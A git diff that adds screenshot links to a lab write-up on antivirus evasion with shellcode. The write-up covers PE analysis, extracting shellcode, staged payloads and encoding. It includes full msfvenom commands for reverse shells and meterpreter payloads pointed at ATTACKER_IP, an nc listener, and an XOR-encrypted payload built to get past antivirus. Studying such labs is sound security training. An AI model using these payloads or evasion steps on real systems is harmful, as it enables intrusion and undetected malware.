@@ -32,20 +32,24 @@ In the VM of this room, there is a tool called **PE-Bear** which is used to pars
 PE-Bear provides a graphic user interface to show all relevant EXE details. To load an EXE file for analysis, we select **File -> Load PEs**. Then, once the file is loaded, we can see all PE details.
 
 First, I load the **thm-intro2PE.exe** file**What is the last 6 digits of the MD5 hash value of the file?**
-
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img001_image151.png)
 Answer: 530949
 
 **What is the Magic number value of the file (in Hex)?**
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img002_image152.png)
 
 Answer: 5A4D
 
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img003_image153.png)
 **What is the Entry Point value of the file?**
 Answer: 12E4
 
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img004_image154.png)
 **How many Sections does the file have?**
 Answer: 7
 
 **A custom section could be used to store extra data. Malware developers use this technique to create a new section that contains their malicious code and hijack the flow of the program to jump and execute the content of a new section. What is the name of the extra section?**
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img005_image155.png)
 
 .flag
 
@@ -68,6 +72,7 @@ One purpose of well-crafted shellcode is to evade AV software or security soluti
 Another concept is **syscalls**.
 A syscall is the way in which a program requests the kernel to do something.
 Each operating system has a different calling convention regarding syscalls.
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img006_image156.png)
 For 64-bit Linux for example, you can call the needed functions from the kernel by setting up the following values:
 
 The **rax** register is used to indicate the function in the kernel we wish to call.
@@ -85,6 +90,7 @@ For **sys_exit**, rdi needs to be set to the exit code for the program.
 We will use code 0, which means the program exited successfully.
 
 **I shall now create a file called thm.asm with the code the room provides.**
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img007_image157.png)
 I then compile and link the ASM code to create an x64 Linux executable file and then execute it as follows:
 (also notice the two files at the bottom)
 
@@ -96,16 +102,20 @@ The **-o** option is used to specify the name of the output executable file.
 
 Now that we have the compiled ASM program, we extract the shellcode with the **objdump** command by dumping the **.text** section of the compiled binary.
 
-I shall now extract the hex value from the above output using the **objcopy** command to dump the **.text** section into a new file called **thm.text** in a binary format:
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img008_image158.png)
 
+I shall now extract the hex value from the above output using the **objcopy** command to dump the **.text** section into a new file called **thm.text** in a binary format:
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img009_image159.png)
 This text file now contains the shellcode in binary format, able to be used.
 We need to convert it into hex though.
 
 The **xxd** command has the **-i** option that will output the file into a C string directly:
-
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img010_image160.png)
 And with that, we have turned our ASM assembly into a formatted shellcode!
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img011_image161.png)
 We can then inject this shellcode into a C program and try to run it with the following commands:
 
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img012_image162.png)
 Then we modify it to get the flag in this section:
 
 **Generate Shellcode**Here we will generate and execute shellcode using public tools like the Metasploit framework.
@@ -120,13 +130,20 @@ These have a tendency to be easily detected however since they are well-known to
 We will now use Msfvenom on the AttackBox to generate a shellcode that executes Windows files.
 We will be creating a shellcode that runs the **calc.exe** application.
 
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img013_image163.png)
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img014_image164.png)
+
 **Shellcode Injection**
 Now, we continue using the generated shellcode and execute it on the operating system. We will put the shellcode in a file named **calc.c**
 
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img015_image165.png)
 Then, we **compile it as an exe file:**
 
 Now we transfer the exe file to the Windows machine to execute it, usin **smbclient** to access the SMB share on the THM AttackBox.
 
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img016_image166.png)
+
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img017_image167.png)
 And indeed, on the Windows machine, it opens calc.exe!
 
 **Generating Shellcode from EXE Files**
@@ -136,7 +153,10 @@ Shellcode can also be stored in **.bin** files, which is a raw data format. In t
 C2 commands provide shellcode as a raw binary file **.bin**. If this is the case, we can use the Linux system command **xxd** to get the hex representation of the binary file.
 To do so, we execute the following command: **xxd -i**
 
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img018_image168.png)
+
 And then **xxd** on this file:
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img019_image169.png)
 
 **Staged Payloads**
 Payloads are categorized as either **staged** or **stageless**.
@@ -215,9 +235,12 @@ We will now compile the file “staged-payload.cs” located at C:\Tools\CS Tile
 
 **(I copied the file to Desktop and renamed it)**
 
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img020_image170.png)
+
 **Using our stager to run a reverse shell**
 Now that the payload is compiled, we need to setup a web server to host the final shellcode. The stager will connect to this server to retrieve the shellcode and execute it in the victim’s machine **in-memory.**
 We firstly generate a shellcode using the command:**msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'**
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img021_image171.png)
 
 We are using the raw format for our shellcode, as the stager will directly load whatever it downloads into memory.
 
@@ -225,8 +248,9 @@ Since we have a shellcode now, we will setup a simple HTTPS server. To do that, 
 
 Since we don’t need this SSL certificate to be valid, we can leave the input fields empty.
 
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img022_image172.png)
 Now, we spawn the HTTPS server using python3, in a custom file in the same directory as the shellcode.bin file:
-
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img023_image173.png)
 We then start the listener for the reverse shell:**nc -lvnp 7474**
 
 **Introduction to Encoding and Encryption**
@@ -239,6 +263,8 @@ Understanding both **encoding** and **encryption** matters for **evasion** becau
 Public tools like **Metasploit** will provide encoding and encryption features by themselves.
 AV solutions take great measures to detect these payloads however and if we don’t modify these payloads ourselves, they will be detected on sight upon touching the victim’s disk.
 We will now generate a simple payload. Within msfvenom, let’s list all available encoders:**msfvenom --list encoders | grep excellent**
+
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img024_image174.png)
 
 Then, we indicate the encoder that we want to use. In this case, we want to use the **shigata_ga_nai** encoder with the **-e **(encoder) switch, and then specify that we want to encode the payload three times with the **-i** (iterations) switch:
 
@@ -254,11 +280,15 @@ We can use the following command to list available encryption algorithms though:
 
 **msfvenom --list encrypt**
 
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img025_image175.png)
 Now to build an XOR encrypted payload, we will need to specify a key. The command would be like this:
 **msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key “MyZekr3tKey***” -o xored-revshell.exe**
 
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img026_image176.png)
+
 We now visit the THM AV website at the IP provided,, then upload this xored-revshell.exe file.
 As we can see, it is nonetheless detected.
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img027_image177.png)
 
 So, now we will try to create a **Custom Payload**.
 We need to use our own encoding schemes so that the AV doesn’t know what to do when analyzing our payload. All we need to do is make the task confusing enough for the AV to analyze.
@@ -267,6 +297,7 @@ For this task, we will take a simple reverse shell generated by msfvenom and use
 
 Let’s generate a reverse shell with msfvenom in CSharp format.
 **msfvenom LHOST=ATTACKER_IP LPORT=433 -p windows/x64/shell_reverse_tcp -f csharp**
+![](../../assets/storage/images/writeups/av_evasion_shellcode/img028_image178.png)
 
 **The Encoder**
 Before building the actual payload, we will create a program that takes the shellcode we just created, and then encodes it in any way we would prefer.
